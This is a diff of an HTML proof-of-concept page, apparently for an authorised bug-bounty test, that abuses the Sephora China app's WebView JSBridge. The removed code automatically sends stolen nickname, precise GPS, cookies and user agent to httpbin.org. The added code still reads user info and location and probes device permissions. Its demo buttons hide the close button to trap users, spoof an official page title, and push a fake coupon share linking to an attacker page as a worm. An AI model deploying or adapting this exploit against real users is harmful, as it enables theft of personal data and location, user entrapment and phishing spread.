@@ -7,156 +7,162 @@
 <style>
 *{box-sizing:border-box}
 body{font-family:-apple-system,'PingFang SC',sans-serif;margin:0;background:#0d0d0d;color:#fff;min-height:100vh;padding:20px;display:flex;flex-direction:column;align-items:center}
-.check{font-size:60px;color:#c9a96e;margin:20px 0 10px}
-h1{font-size:22px;margin:0 0 6px;color:#c9a96e}
-.sub{font-size:12px;color:rgba(255,255,255,.5);margin-bottom:20px}
-.data-box{width:100%;max-width:360px;background:#1a1a1a;border:1px solid rgba(201,169,110,.3);border-radius:12px;padding:16px;margin:10px 0}
-.data-box h3{font-size:14px;color:#c9a96e;margin:0 0 8px;display:flex;align-items:center;gap:6px}
-.data-val{font-family:monospace;font-size:13px;color:#ff6b6b;padding:8px;background:#0a0a0a;border-radius:8px;word-break:break-all;white-space:pre-wrap;min-height:36px}
-.ok{color:#00c853;font-size:12px;margin-top:6px}
-.fail{color:#ff5252;font-size:12px;margin-top:6px}
-.sent{font-size:11px;color:rgba(255,255,255,.3);margin-top:20px;text-align:center;line-height:1.8}
-#banner{display:none;position:fixed;top:0;left:0;right:0;z-index:99999;background:#ff0000;color:#fff;padding:12px;text-align:center;font-weight:bold;font-size:14px}
+.check{font-size:50px;color:#c9a96e;margin:16px 0 8px}
+h1{font-size:20px;margin:0 0 4px;color:#c9a96e}
+.sub{font-size:12px;color:rgba(255,255,255,.5);margin-bottom:16px}
+.box{width:100%;max-width:360px;background:#1a1a1a;border:1px solid rgba(201,169,110,.25);border-radius:12px;padding:14px;margin:8px 0}
+.box h3{font-size:13px;color:#c9a96e;margin:0 0 6px}
+.val{font-family:monospace;font-size:12px;color:#ff6b6b;padding:8px;background:#0a0a0a;border-radius:8px;word-break:break-all;white-space:pre-wrap;min-height:32px}
+.note{font-size:10px;color:rgba(255,255,255,.4);margin-top:4px}
+#banner{display:none;position:fixed;top:0;left:0;right:0;z-index:99999;background:#cc0000;color:#fff;padding:10px;text-align:center;font-weight:bold;font-size:13px}
+.btn-demo{display:inline-block;margin:12px 4px;padding:10px 20px;border:1px solid rgba(201,169,110,.4);border-radius:20px;color:#c9a96e;font-size:13px;cursor:pointer;background:transparent}
 </style>
 </head>
 <body>
-<div id="banner">⚠️ 数据已被窃取!</div>
-<div class="check">⚠️</div>
-<h1>攻击成功 — 数据窃取演示</h1>
-<div class="sub">此页面已加载到丝芙兰 APP WebView 中</div>
+<div id="banner">⚠️ 此页面正在丝芙兰 APP 内运行 — JSBridge 已被攻击者控制</div>
+<div class="check">🚨</div>
+<h1>JSBridge 攻击演示</h1>
+<div class="sub">此页面通过 sephora://openurl 加载到 APP WebView</div>
 
-<div class="data-box">
+<div class="box">
+  <h3>✅ appHandler 桥检测</h3>
+  <div class="val" id="r0">检测中…</div>
+  <div class="note">桥存在 = addJavascriptInterface 无域校验 (H1)</div>
+</div>
+
+<div class="box">
   <h3>👤 getUserInfo()</h3>
-  <div class="data-val" id="r1">⏳ 调用中…</div>
-  <div class="ok" id="r1s"></div>
+  <div class="val" id="r1">调用中…</div>
+  <div class="note" id="r1n">返回 SharedPreferences key=kol_user_name</div>
 </div>
 
-<div class="data-box">
+<div class="box">
   <h3>📍 getGPS (精确定位)</h3>
-  <div class="data-val" id="r2">⏳ 调用中…</div>
-  <div class="ok" id="r2s"></div>
+  <div class="val" id="r2">调用中…</div>
+  <div class="note">异步回调 → sep._onSuccess → 返回经纬度</div>
 </div>
 
-<div class="data-box">
-  <h3>🍪 document.cookie</div>
-  <div class="data-val" id="r3">⏳ 读取中…</div>
-  <div class="ok" id="r3s"></div>
+<div class="box">
+  <h3>📱 hasPermission (权限探测)</h3>
+  <div class="val" id="r3">探测中…</div>
+  <div class="note">枚举设备权限状态</div>
 </div>
 
-<div class="data-box">
-  <h3>📱 设备信息 (UserAgent)</div>
-  <div class="data-val" id="r4" style="color:#aaa;font-size:11px"></div>
+<div class="box">
+  <h3>🍪 document.cookie</h3>
+  <div class="val" id="r4" style="color:#666">→ 攻击者域 = 无 cookie</div>
+  <div class="note">此页面在 github.io 域，sephora.cn 的 cookie 不可见<br>
+  ⚠️ Cookie 只能通过 callH5Js 注入到 sephora.cn 页面时才能偷(见引导页按钮2)</div>
 </div>
 
-<div class="sent" id="exfil">
-  数据外传状态: 等待…
+<div style="margin:16px 0 8px">
+  <button class="btn-demo" onclick="demoTrap()">🔒 演示: hideCloseButton (绑架用户)</button>
+  <button class="btn-demo" onclick="demoTitle()">📝 演示: setTitle (伪造标题)</button>
+  <button class="btn-demo" onclick="demoShare()">📤 演示: share (社交蠕虫)</button>
+</div>
+
+<div class="sub" style="margin-top:16px;font-size:10px;line-height:1.8">
+  ⚠️ 授权 SRC 安全测试 PoC — 证明丝芙兰 App JSBridge 无域校验<br>
+  攻击链: sephora://openurl?url=attacker.com → bridge 注入 → 数据窃取/用户绑架<br>
+  全程零 frida · 零工具 · 仅需正常点击链接
 </div>
 
 <script>
-// ═══ 检测桥 ═══
 var hasBridge = typeof window.appHandler !== 'undefined';
-if (!hasBridge) {
-  document.body.innerHTML = '<div style="padding:40px;text-align:center;color:#ff5252"><h2>❌ appHandler 桥不存在</h2><p>此页面可能不在丝芙兰 APP WebView 中</p></div>';
-} else {
-  document.getElementById('banner').style.display = 'block';
-}
-
-// 收集到的所有数据
 var stolen = {};
 
-// ═══ 1. getUserInfo() — 同步返回用户信息 ═══
-try {
-  var userInfo = window.appHandler.getUserInfo();
-  stolen.userInfo = userInfo;
-  document.getElementById('r1').textContent = userInfo || '(空)';
-  document.getElementById('r1').textContent += '';
-  document.getElementById('r1s').textContent = '✓ 获取成功 — 来自 SharedPreferences kol_user_name';
-  document.getElementById('r1s').className = 'ok';
-} catch(e) {
-  document.getElementById('r1').textContent = '调用失败: ' + e.message;
-  document.getElementById('r1s').textContent = '✗ ' + e.message;
-  document.getElementById('r1s').className = 'fail';
+// 桥检测
+if (!hasBridge) {
+  document.body.innerHTML = '<div style="padding:40px;text-align:center"><h2 style="color:#ff5252">❌ 不在 APP WebView 中</h2><p style="color:#888">需要在丝芙兰 APP 内打开才能看到攻击效果</p></div>';
+} else {
+  document.getElementById('banner').style.display = 'block';
+  document.getElementById('r0').textContent = '✅ window.appHandler 存在 — 桥已注入到攻击者域';
+  document.getElementById('r0').style.color = '#00c853';
 }
 
-// ═══ 2. getGPS — 异步回调(需要设置 sep._onSuccess) ═══
-// 设置回调(丝芙兰 JSBridge 的回调格式)
+// 1. getUserInfo (同步返回)
+try {
+  var u = window.appHandler.getUserInfo();
+  stolen.userInfo = u;
+  document.getElementById('r1').textContent = '"' + u + '" (已脱敏昵称)';
+} catch(e) {
+  document.getElementById('r1').textContent = '错误: ' + e.message;
+}
+
+// 2. getGPS (异步回调)
 window.sep = window.sep || {};
 window.sep._onSuccess = function(callId, data) {
   var d = typeof data === 'string' ? data : JSON.stringify(data);
   stolen.gps = d;
   document.getElementById('r2').textContent = d;
-  document.getElementById('r2s').textContent = '✓ 精确定位已获取';
-  document.getElementById('r2s').className = 'ok';
-  exfil();
+  document.getElementById('r2').style.color = '#ff4444';
+};
+window.sep._onFailure = function(callId, err) {
+  document.getElementById('r2').textContent = '失败: ' + JSON.stringify(err).substring(0, 200);
+};
+try {
+  window.appHandler.appMonitorScript('getGPS', 'gps1', '{}');
+} catch(e) {
+  document.getElementById('r2').textContent = '调用错误: ' + e.message;
+}
+setTimeout(function() {
+  if (!stolen.gps) document.getElementById('r2').textContent = '(超时 — 需要位置权限或GPS未开启)';
+}, 6000);
+
+// 3. hasPermission 探测多个权限
+var perms = ['android.permission.ACCESS_FINE_LOCATION','android.permission.CAMERA','android.permission.RECORD_AUDIO','android.permission.READ_EXTERNAL_STORAGE'];
+var permResults = [];
+window.appHandler.appMonitorScript('hasPermission', 'perm1', JSON.stringify({permission: perms[0]}));
+// 逐个探测(每个用一个callId)
+perms.forEach(function(p, i) {
+  var cid = 'perm_' + i;
+  window.appHandler.appMonitorScript('hasPermission', cid, JSON.stringify({permission: p}));
+});
+window.sep._onSuccess = function(callId, data) {
+  if (callId === 'gps1') {
+    stolen.gps = data;
+    document.getElementById('r2').textContent = JSON.stringify(data);
+  } else if (callId.startsWith('perm_')) {
+    var idx = parseInt(callId.split('_')[1]);
+    var val = typeof data === 'object' ? data.value : '?';
+    permResults.push(perms[idx].split('.').pop() + ': ' + (val === '1' ? '已授权' : '未授权'));
+    document.getElementById('r3').textContent = permResults.join('\n');
+  }
 };
 
-try {
-  window.appHandler.appMonitorScript('getGPS', 'gps_call_1', '{}');
-  document.getElementById('r2s').textContent = '⏳ 等待 GPS 回调…';
-} catch(e) {
-  document.getElementById('r2').textContent = '调用失败: ' + e.message;
-  document.getElementById('r2s').className = 'fail';
+// 4. Cookie (不同域, 必然为空)
+document.getElementById('r4').textContent = 'document.cookie = "' + (document.cookie || '(空)') + '"';
+
+// ═══ 攻击演示按钮 ═══
+
+// 隐藏关闭按钮 — 用户被困
+function demoTrap() {
+  try {
+    window.appHandler.appMonitorScript('hideCloseButton', 'trap1', '{}');
+    alert('⚠️ 关闭按钮已被隐藏!\n\n用户现在无法通过关闭按钮退出此页面。\n\n这就是"用户绑架"——受害者被困在攻击者页面中。');
+  } catch(e) { alert('hideCloseButton: ' + e); }
 }
 
-// 超时处理
-setTimeout(function() {
-  if (!stolen.gps) {
-    document.getElementById('r2').textContent = '(超时 — 可能需要用户授权位置权限)';
-    document.getElementById('r2s').textContent = '⚠️ 回调未收到(5s超时)';
-  }
-}, 5000);
-
-// ═══ 3. Cookie ═══
-try {
-  var cookie = document.cookie || '(此域无cookie)';
-  stolen.cookie = cookie;
-  document.getElementById('r3').textContent = cookie.substring(0, 500) || '(空)';
-  document.getElementById('r3s').textContent = cookie ? '✓ Cookie 读取成功 (' + cookie.length + ' 字)' : '(攻击者域无cookie, 若在 sephora.cn 域则有)';
-  document.getElementById('r3s').className = cookie ? 'ok' : '';
-} catch(e) {
-  document.getElementById('r3').textContent = '读取失败';
+// 伪造标题
+function demoTitle() {
+  try {
+    window.appHandler.appMonitorScript('setTitle', 'title1', JSON.stringify({title: '丝芙兰官方商城'}));
+    alert('⚠️ 标题栏已改为"丝芙兰官方商城"\n\n用户看到的是"官方"页面，实际是攻击者控制的。');
+  } catch(e) { alert('setTitle: ' + e); }
 }
 
-// ═══ 4. UserAgent ═══
-document.getElementById('r4').textContent = navigator.userAgent;
-
-// ═══ 5. 外传数据(模拟攻击者收集) ═══
-function exfil() {
-  var payload = JSON.stringify({
-    timestamp: new Date().toISOString(),
-    userInfo: stolen.userInfo || 'N/A',
-    gps: stolen.gps || 'N/A',
-    cookie: stolen.cookie || 'N/A',
-    ua: navigator.userAgent,
-    url: location.href
-  });
-
-  // 方式1: 发到收集端(模拟攻击者服务器)
-  // 用 Image beacon(不会被 CORS 阻止)
-  var img = new Image();
-  img.src = 'https://httpbin.org/get?stolen=' + encodeURIComponent(payload.substring(0, 1800));
-
-  // 方式2: fetch(如果目标允许 CORS)
-  fetch('https://httpbin.org/post', {
-    method: 'POST',
-    body: payload,
-    headers: {'Content-Type': 'application/json'}
-  }).then(function(r) {
-    return r.json();
-  }).then(function(d) {
-    document.getElementById('exfil').innerHTML =
-      '✅ 数据已外传到攻击者服务器 (httpbin.org)<br>' +
-      '📦 Payload: ' + (payload.length) + ' 字节<br>' +
-      '🔗 <a href="https://httpbin.org" style="color:#c9a96e">查看收集端</a>';
-  }).catch(function(e) {
-    document.getElementById('exfil').innerHTML =
-      '📡 Image beacon 已发送 (绕过CORS)<br>' +
-      '📦 数据量: ' + payload.length + ' 字节';
-  });
+// 分享到社交圈(蠕虫)
+function demoShare() {
+  try {
+    window.appHandler.share(
+      '🎁 丝芙兰新客礼遇！点击领取',
+      '丝芙兰PINK会员专享，满300减100',
+      'https://ssl1.sephorastatic.cn/vipremind/bg@3x.jpg',
+      'https://derham1999.github.io/ai-daily/sephora-guide.html'
+    );
+    alert('⚠️ 分享面板已弹出!\n\n如果用户点击分享，攻击者链接会传播到他们的微信/朋友圈。\n\n这是社交蠕虫传播向量。');
+  } catch(e) { alert('share: ' + e); }
 }
-
-// 3秒后自动外传(无论GPS是否返回)
-setTimeout(exfil, 3000);
 </script>
 </body>
 </html>
